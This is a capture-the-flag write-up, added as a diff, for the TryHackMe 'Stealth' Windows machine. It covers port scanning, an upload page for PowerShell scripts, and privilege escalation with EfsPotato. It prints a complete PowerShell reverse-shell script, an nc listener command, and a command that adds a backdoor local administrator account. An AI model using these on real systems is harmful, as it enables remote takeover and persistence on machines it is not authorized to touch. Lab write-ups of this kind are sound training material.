@@ -1,0 +1,342 @@
+---
+title: TryHackMe Stealth
+description: Writeup
+---
+
+## Overview
+- **Machine Name:** Stealth
+- **OS:** Windows
+- **Difficulty:** Medium
+
+## Summary
+The initial foothold was achieved via a web application that allowed the upload of PowerShell scripts, leading to a reverse shell. Privilege escalation was then performed using a known exploit for Windows with SeImpersonatePrivilege enabled.
+
+## Reconnaissance
+### Nmap Scan Results
+
+```java
+# Nmap 7.94SVN scan initiated Sat Jun  1 15:33:54 2024 as: nmap -sCV --min-rate=5000 -Pn -vvv -oN targeted 10.10.207.252
+Nmap scan report for 10.10.207.252
+Host is up, received user-set (0.24s latency).
+Scanned at 2024-06-01 15:33:54 CEST for 57s
+Not shown: 994 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON          VERSION
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+|_ssl-date: 2024-06-01T13:34:50+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=HostEvasion
+| Issuer: commonName=HostEvasion
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-05-31T13:32:55
+| Not valid after:  2024-11-30T13:32:55
+| MD5:   9d55:b574:987e:0a7e:048e:6a49:c392:4879
+| SHA-1: 7d38:a0f2:5287:c82e:2cf6:a3b8:1a28:fe3f:eabd:d103
+| -----BEGIN CERTIFICATE-----
+| MIIC2jCCAcKgAwIBAgIQWHL803uha5RLEF1cGEew3DANBgkqhkiG9w0BAQsFADAW
+| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yNDA1MzExMzMyNTVaFw0yNDExMzAx
+| MzMyNTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEAuPV6kYKAWBdPLFx0VKPcmrDsSg4Q3ghqcn2KcCSZ25mU
+| oQmCRpT6R86jP5Gx7RU3IMFtlGLvRGtCMXeHPpLDMqpgYiT2LR88jRfK1y01iNIy
+| qqCY1oX2TFoYe5PXR8MoTqbxqCNobM7UXhMhPA+DPDmsNUnk/jimYAdM6XpdejOl
+| RnEkVca+S/eSN/uSjgNuu1kQkToDeEWNgDnPmEAoV6wFfoJFyst/lWRCivMCEKqb
+| UXvcuRK1MdCTzWgXkrXogrLLzG9J5czP97zk+FM2nqC3/EFnh/+attCs0KDEyfjT
+| K9al1xrpb/68uKQ2otG1u7DByNfumh7gopq1I+YMwQIDAQABoyQwIjATBgNVHSUE
+| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBADFx
+| haJ95+nRqjER2FQoz7YulfT2x5pZZhB3kODqQvftaDkIQGhpzgPSyPR6tmsi56yJ
+| q3omLHcoIEB6IHgYJbG/f/KjHsKj72jsImiNsfKGbCAzqfcmT/J2wacWPc2KbEy5
+| Jzy7buQSf1mpfhWxn4opq7QM/qln1s51elxAovODNdgfgr2NhlT99BdVbrF9LJH6
+| Tihja00PyobGM6nxKED1I9tPX5tOljb9WJ3C7FikzyTojvMape7Jp9ucs+f4DXxF
+| 4uR+AUFOJuZ50HKFj6NfMhGcXcHgNHDpOEDX/LN8bSJx1iduEFz9cT8Gh0Uc97Ap
+| 3MDcLlUmEiWatx/fvnY=
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: HOSTEVASION
+|   NetBIOS_Domain_Name: HOSTEVASION
+|   NetBIOS_Computer_Name: HOSTEVASION
+|   DNS_Domain_Name: HostEvasion
+|   DNS_Computer_Name: HostEvasion
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-06-01T13:34:11+00:00
+8000/tcp open  http          syn-ack ttl 127 PHP cli server 5.5 or later
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 404 Not Found
+8080/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: PowerShell Script Analyser
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+8443/tcp open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-title: PowerShell Script Analyser
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
+| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
+| -----BEGIN CERTIFICATE-----
+| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
+| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
+| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
+| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
+| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
+| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
+| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
+| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
+|_-----END CERTIFICATE-----
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-06-01T13:34:11
+|_  start_date: N/A
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 30773/tcp): CLEAN (Timeout)
+|   Check 2 (port 9834/tcp): CLEAN (Timeout)
+|   Check 3 (port 15962/udp): CLEAN (Timeout)
+|   Check 4 (port 44932/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jun  1 15:34:51 2024 -- 1 IP address (1 host up) scanned in 57.77 seconds
+```
+
+### Observations
+- **SMB Ports:** 139, 445 (common for Windows networking)
+- **RDP:** 3389 (Remote Desktop Protocol)
+- **HTTP Services:** 8000, 8080, 8443 (web services, PowerShell script analyser)
+- **HTTPS:** 8443 (Apache on Windows, self-signed certificate)
+
+## Exploitation
+
+### Web Application (8080)
+1. **Service Identification:** The web application running on port 8080 is identified as "PowerShell Script Analyser."
+2. **Upload Functionality:** Allows for the upload of PowerShell scripts.
+
+```powershell
+curl -v http://10.10.37.168:8080/
+*   Trying 10.10.37.168:8080...
+* Connected to 10.10.37.168 (10.10.37.168) port 8080
+> GET / HTTP/1.1
+> Host: 10.10.37.168:8080
+> User-Agent: curl/8.7.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Sat, 01 Jun 2024 15:48:31 GMT
+< Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+< X-Powered-By: PHP/8.0.28
+< Content-Length: 2140
+< Content-Type: text/html; charset=UTF-8
+< 
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PowerShell Script Analyser</title>
+  <style>
+	@import url("font.css");
+    body {
+	  height: 100vh;
+      font-family: "Ubuntu", "Source Sans Pro", sans-serif !important;
+      margin: 0;
+      padding: 0;
+      background-color: #f2f2f2;
+      background-image: url('background-image.jpg');
+	  background-repeat:no-repeat;
+      background-size: cover;
+      background-position: center;
+    }
+	
+	.container-box {
+		padding: 35px 0;
+	}
+    
+    .container {
+      max-width: 500px;
+		margin: 0 auto;
+		padding: 20px;
+		box-shadow: 2px 2px 20px rgba(0, 0, 0);
+		border-radius: 6px;
+		background-color: #dddddd;
+	}
+    
+    h1 {
+      margin-top: 0;
+      margin-bottom: 20px;
+      color: #333;
+      text-align: center;
+    }
+    
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    input[type="file"] {
+      margin-bottom: 10px;
+    }
+    
+    button[type="submit"] {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 50px;
+	  cursor: pointer;
+      border-radius: 4px;
+    }
+    
+    button[type="submit"]:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+	<div class="container-box">
+	  <div class="container">
+		<h1>PowerShell Script Analyser</h1>
+				
+		
+		<form action="" method="POST" enctype="multipart/form-data">
+		  <input type="file" name="fileInput">
+		  <button type="submit" name="uploadButton">Upload</button>
+		  <p style="margin-bottom: 0;">
+		  Please upload any .ps1 PowerShell script to see if it is malicious or not (Dev Mode). The tool is in dev-mode and only allow .ps1 format at this stage.				</p>
+		</form>
+	  </div>
+	 </div>
+  
+  <script>
+    // Optional: You can use JavaScript to show a message after the file is uploaded
+    const form = document.querySelector('form');
+    
+    form.addEventListener('submit', () => {
+      setTimeout(() => {
+        alert('File uploaded successfully!');
+      }, 3000); // 3 seconds delay
+    });
+  </script>
+</body>
+</html>
+* Connection #0 to host 10.10.37.168 left intact
+```
+
+#### Exploit Steps
+1. **Upload Malicious Script:**
+    - Created a PowerShell reverse shell script.
+    - Uploaded the script via the "PowerShell Script Analyser" interface.
+
+```powershell
+do {
+    # Delay before establishing network connection, and between retries
+    Start-Sleep -Seconds 1
+
+    # Connect to C2
+    try{
+        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.2', 13337)
+    } catch {}
+} until ($TCPClient.Connected)
+
+$NetworkStream = $TCPClient.GetStream()
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+
+# Writes a string to C2
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
+
+    # Write to C2
+    $StreamWriter.Write($String + 'SHELL> ')
+    $StreamWriter.Flush()
+}
+
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
+
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+
+    # Write output to C2
+    WriteToStream ($Output)
+}
+# Closes the StreamWriter and the underlying TCPClient
+$StreamWriter.Close()
+```
+
+2. **Start Listener:**
+    - On the attacker's machine, a Netcat listener was started to catch the reverse shell.
+
+    ```bash
+    nc -lvnp 4444
+    ```
+
+3. **Trigger Execution:**
+    - After uploading, executed the script via the web application.
+
+### Initial Foothold
+- **Obtained Shell:** Successfully received a reverse shell on the attacker's machine.
+- **Verification:** Confirmed access by checking the current user and directories.
+
+## Privilege Escalation
+
+### Enumeration
+1. **System Information:**
+    - The machine is running Windows Server with multiple services and privileges enabled.
+
+2. **User Privileges:**
+    - The user has `SeImpersonatePrivilege` enabled.
+
+### Exploit (EfsPotato)
+1. **Tool:** EfsPotato was chosen due to `SeImpersonatePrivilege`.
+https://github.com/zcgonvh/EfsPotato
+#### Steps
+1. **Download EfsPotato:**
+    - Transferred the EfsPotato executable to the target machine and compile.
+```powershell
+C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efs.cs -nowarn:1691,618
+```
+
+2. **Execute EfsPotato:**
+    - Used EfsPotato to escalate privileges.
+
+```java
+.\efs.exe whoami
+```
+
+```java
+-----------Command to create and add user to the net localgroup administrators group  
+.\efs.exe "cmd.exe /c net user user password@123 /add && net localgroup administrators user /add"
+```
+
+3. **Result:**
+    - Obtained a SYSTEM shell.
